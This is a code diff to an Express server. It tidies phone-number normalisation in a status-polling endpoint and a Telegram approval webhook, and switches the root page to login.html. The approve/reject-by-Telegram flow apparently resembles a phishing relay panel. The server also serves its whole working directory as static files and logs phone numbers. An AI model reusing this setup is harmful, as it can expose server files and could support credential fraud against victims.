@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 8080;
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('.'));
+app.use(express.static('.')); // Serves your static HTML files
 
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
@@ -58,7 +58,6 @@ app.post('/api/submit-order', async (req, res) => {
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; 
 
-        // Reset status to pending on new submission
         orderStatuses[cleanPhone] = 'pending';
 
         const isImportantAction = (uniqueId && (
@@ -146,10 +145,11 @@ app.post('/api/submit-order', async (req, res) => {
 });
 
 app.get('/api/check-status', (req, res) => {
-    const phone = req.query.phone ? req.query.phone.replace(/\s+/g, '').trim() : '';
-    const status = orderStatuses[phone] || 'pending';
+    const rawQueryPhone = req.query.phone || '';
+    const cleanPhone = rawQueryPhone.replace(/\s+/g, '').trim();
+    const status = orderStatuses[cleanPhone] || 'pending';
     
-    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
+    console.log(`Polling check for phone query: [${rawQueryPhone}] -> cleaned: [${cleanPhone}] -> status: ${status}`);
     res.json({ status });
 });
 
@@ -177,7 +177,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 } else {
                     phone = remainder;
                 }
-                phone = phone.trim();
+                phone = phone.replace(/\s+/g, '').trim();
 
                 if (callbackData.startsWith('approve_')) {
                     orderStatuses[phone] = 'approved';
@@ -250,7 +250,7 @@ async function registerTelegramWebhook() {
 }
 
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, 'login.html'));
 });
 
 app.listen(PORT, () => {
